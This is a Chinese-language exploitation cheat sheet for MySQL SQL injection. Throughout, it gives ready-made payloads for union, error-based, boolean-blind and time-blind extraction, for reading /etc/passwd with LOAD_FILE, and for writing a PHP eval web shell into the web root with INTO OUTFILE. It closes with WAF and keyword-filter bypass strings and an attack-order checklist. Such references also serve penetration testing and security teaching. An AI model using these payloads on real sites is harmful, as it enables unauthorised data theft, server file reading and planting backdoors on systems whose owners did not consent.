# EXP手册-SQL injection(MySQL)

## 一句话理解
MySQL 注入的本质，是攻击者让可控输入进入 SQL 语句的语法结构中，从而改变原查询逻辑，实现认证绕过、数据读取、盲注枚举、文件读写甚至进一步拿下主机。

## 常见危害
- 登录绕过、权限绕过
- 读取数据库结构和敏感数据
- 通过报错、布尔盲注、时间盲注做无回显利用
- 读取服务器文件
- 在具备条件时写文件、落 WebShell
- 与 WAF 绕过、Token 绕过、二次注入联动

## 常见注入类型
- Union 型注入
- 报错型注入
- Bool 型盲注
- 时间型盲注
- 堆叠查询与多语句利用（受驱动和配置影响）
- 二次注入

## 基础枚举语句
### 1. 查询数据库名

```sql
SELECT database();
SELECT schema_name FROM information_schema.schemata;
SELECT DISTINCT(db) FROM mysql.db;
```

### 2. 查询表名

```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = database();
```

### 3. 查询列名

```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'tablename';
```

## 常用常量与函数
- 当前用户：`user()`
- 查询版本：`version()`、`@@version`、`@@global.version`
- 查询主机名：`@@hostname`
- 查询安全目录：`@@global.secure_file_priv`

## 常见利用流程
### 1. 判断是否可控
先用最小探针确认参数是否进入 SQL 结构，例如：
- `'`
- `"`
- `and 1=1`
- `and 1=2`

### 2. 判断回显能力
区分：
- 直接回显
- 报错回显
- 无回显

### 3. 选择利用方式
通常顺序为：
1. Union 注入
2. 报错型注入
3. Bool 盲注
4. 时间盲注

## Union 注入
### 1. 判断字段数
常用 `ORDER BY`：

```sql
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

不断增加直到报错，即可推测原查询字段数。

### 2. 寻找输出位
通过 `UNION SELECT 1,2,3...` 判断哪些字段会显示在页面中。

### 3. 构造利用
示例：

```sql
SELECT username, password, permission FROM Users WHERE id = '1';
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
```

若 `ORDER BY 4` 报错，说明字段数为 3。

进一步利用：

```sql
-1' UNION SELECT 1,2,3--+
-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--+
```

## 报错型注入
适合“页面不直接显示查询结果，但会返回数据库错误信息”的场景。

常见报错函数或思路：
- `floor(rand())`
- `extractvalue()`
- `updatexml()`
- 几何函数
- `exp()`
- `GTID_SUBSET()`
- `GTID_SUBTRACT()`
- `ST_LatFromGeoHash()`
- `ST_LongFromGeoHash()`
- `ST_PointFromGeoHash()`

### 1. `floor(rand())` 方式

```sql
select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;
```

利用分组和随机数重复导致的报错把数据带出来。

### 2. `extractvalue()` / `updatexml()`
这两个 XML 相关函数在很多历史版本里是高频报错利用点：

```sql
select * from mysql.user where user = 'root' and extractvalue(1,concat(0x5c,user()));
select * from mysql.user where user = 'root' and updatexml(1,concat(0x5c,user()),1);
```

若 `concat` 被过滤，可尝试替代：

```sql
select * from mysql.user where user = 'root' and extractvalue(1,make_set(3,'~',version()));
select * from mysql.user where user = 'root' and extractvalue(1,lpad((version()),20,'@'));
```

### 3. 几何函数

```sql
select multipoint((select * from (select * from (select * from (select version())a)b)c));
select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));
```

### 4. 数值溢出
适用于部分版本：

```sql
select exp(~(select * from(select user())x));
```

### 5. 数据重复

```sql
select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
```

### 6. MySQL 5.7 部分函数

```sql
select ST_LatFromGeoHash(version());
select ST_LongFromGeoHash(version());
select GTID_SUBSET(version(),1);
select GTID_SUBTRACT(version(),1);
select ST_PointFromGeoHash(version(),1);
```

## Bool 型盲注
### 1. 判断语句真假

```sql
and 1=1
and 1=2
```

### 2. 按字符枚举

```sql
AND ascii((SELECT SUBSTR(table_name,1,1) FROM information_schema.tables LIMIT 0,1)) = ascii('A')
```

适用于无报错、无直接回显，但页面真假状态可观察的场景。

## 时间型盲注
### 1. 时间探针

```sql
and sleep(5)
```

### 2. 条件判断

```sql
and if((select ord(substring(database(),1,1))) = 97,sleep(5),1)
```

常见写法：

```sql
if((condition), sleep(5), 0)
CASE WHEN (condition) THEN sleep(5) ELSE 0 END
sleep(5*(condition))
```

## 文件读写
### 1. 利用前提
一般需要 `FILE` 权限，且受到 `secure_file_priv` 限制。

### 2. 查询权限

```sql
SELECT @@secure_file_priv;
SELECT file_priv FROM mysql.user WHERE user = 'username';
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%';
```

说明：
- MySQL `>= 5.5.53` 常见情况是 `NULL`，表示禁止导入导出
- MySQL `< 5.5.53` 为空时往往限制更少

### 3. 读文件

```sql
SELECT LOAD_FILE('/etc/passwd');
```

注意点：
- MySQL 账户需要对文件有读取权限
- 文件大小受 `max_allowed_packet` 限制
- `LOAD_FILE()` 并非对所有路径都可用

### 4. 写文件
常用：
- `INTO OUTFILE`
- `INTO DUMPFILE`

示例：

```sql
SELECT '<? @eval($_POST[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';
```

拼接写文件示例：

```sql
admin' or 'a'='a' LIMIT 0,1 INTO OUTFILE '/var/www/html/re.php' FIELDS TERMINATED BY '-' LINES TERMINATED BY '<?phpinfo();?>'---
```

- [Mysql 写入 Webshell](https://www.cnblogs.com/xuyangda/p/14510562.html)

## 常用技巧
### 1. 多行合并一行
#### `concat()`

```sql
select concat(id,0x7e,name) as c from a limit 1;
```

#### `concat_ws()`

```sql
select concat_ws('_',id,name) as c from a limit 1;
```

#### `group_concat()`

```sql
select group_concat(name) as name from a;
```

### 2. 截取字符串
常用：
- `left()`
- `right()`
- `substring()`
- `substring_index()`

示例：

```sql
SELECT LEFT('web-exp-mysql',6);
SELECT RIGHT('web-exp-mysql',6);
SELECT SUBSTRING('web-exp-mysql', 3);
SELECT SUBSTRING_INDEX('web-exp-mysql', '-', 2);
SELECT SUBSTRING_INDEX('web-exp-mysql', '.', -2);
```

## 常见绕过思路
### 1. WAF 绕过
- [sql-injection-fuck-waf](https://notwhy.github.io/2018/06/sql-injection-fuck-waf/)

### 2. 过滤函数绕过
若目标过滤以下关键字或字符：

```text
gtid_subset|updatexml|extractvalue|floor|rand|exp|json_keys|uuid_to_bin|bin_to_uuid|union|like|hash|sleep|benchmark| |;|\*|\+|-|/|<|>|~|!|\d|%|\x09|\x0a|\x0b|\x0c|\x0d|`
```

则可尝试：
- 大小写变形
- 编码变形
- 函数替换
- 运算替换
- 无空格构造
- 布尔表达式拼接

原文保留示例：

```sql
'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')'and(ASCII(substring((select(group_concat(table_name))from(information_schema.TABLES)where(TABLE_SCHEMA='rctf')),(ord('b')MOD(ord('a'))),(ord('b')MOD(ord('a')))))=ASCII('f')
```

### 3. Token 保护绕过
对存在动态 Token 的接口，可借助自动化联动工具处理。

- [Burpsuite+SQLMAP 双璧合一绕过 Token 保护的应用进行注入攻击](https://www.freebuf.com/sectool/128589.html)

## 实战排查思路
- 先判断闭合方式和注入位置
- 先争取直接回显，再退到报错型、布尔盲注、时间盲注
- 先枚举数据库、表、列，再根据权限评估文件读写
- 结合业务看是否能登录绕过、越权或做二次注入
- 关注驱动差异、多语句支持、WAF 和 Token 机制

## 速查清单
- 先探测：引号、布尔、时间
- 再判断：Union、报错、盲注哪条路最短
- 枚举：库、表、列、用户、版本、主机名
- 检查：`FILE` 权限、`secure_file_priv`、可读写路径
- 结合：WAF、Token、二次注入、文件写入

## Reference
- https://www.cnblogs.com/xuyangda/p/14510562.html
- https://www.anquanke.com/post/id/266244
- https://www.freebuf.com/sectool/128589.html
  
